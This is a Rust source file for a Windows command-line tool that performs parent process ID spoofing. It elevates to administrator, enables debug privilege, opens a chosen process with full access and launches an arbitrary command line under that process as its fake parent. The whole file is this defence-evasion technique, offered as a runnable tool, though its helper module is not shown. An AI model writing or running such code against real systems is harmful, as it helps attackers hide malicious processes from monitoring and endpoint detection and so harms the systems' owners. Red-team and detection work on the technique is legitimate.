mod utils;

use windows::Win32::{
    Foundation::CloseHandle,
    System::Threading::{OpenProcess, PROCESS_ALL_ACCESS},
};

use crate::utils::proc::{self, create_process_with_handle};

fn main() {
    unsafe {
        // elevate to admin and enable debug privilege
        proc::elevate_to_admin();
        proc::enable_debug_priv().unwrap();

        // parse args
        let args: Vec<String> = std::env::args().collect();
        let procname = std::path::Path::new(args[0].as_str())
            .file_name()
            .unwrap()
            .to_str()
            .unwrap();

        if args.len() < 3 {
            println!("Usage: {} <ppid> <commandline>", procname);
            return;
        }

        let ppid: u32 = args[1].parse().unwrap();
        let cmdline = args[2].as_str();

        // open target process
        println!("[+] get parent process handle -> {}", ppid);
        let phandle = OpenProcess(PROCESS_ALL_ACCESS, false, ppid).unwrap();
        println!("[+] handle value -> {:#x}", phandle.0);

        // parent process spoofing
        println!("[+] create new process using parent process handle");
        let pid = create_process_with_handle(phandle, cmdline).unwrap();
        CloseHandle(phandle);

        println!("[+] new process -> {}({})", cmdline, pid);

        // use std::process::Command;
        // let _ = Command::new("cmd").args(["/c", "pause"]).status();
    }
}
